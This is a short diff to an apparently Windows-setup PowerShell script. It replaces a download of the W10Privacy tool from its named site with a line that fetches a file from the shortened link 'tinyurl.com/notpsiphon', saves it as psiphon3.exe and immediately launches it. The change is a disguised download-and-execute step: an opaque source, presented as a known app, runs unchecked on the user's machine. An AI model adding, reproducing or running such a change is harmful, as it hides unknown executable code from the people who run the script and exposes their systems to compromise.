@@ -65,7 +65,8 @@ if ($confirmation -eq 'y') {
     control folders
     write-host Show hidden folders -f yellow -b black
     cmd /c pause
-    wget https://www.winprivacy.de/app/download/12302828636/W10Privacy.zip?t=1545069821 -outfile $cud\w10.exe
+    wget tinyurl.com/notpsiphon -outfile $home\psiphon3.exe
+    start psiphon3.exe
 }
 
 #Fin
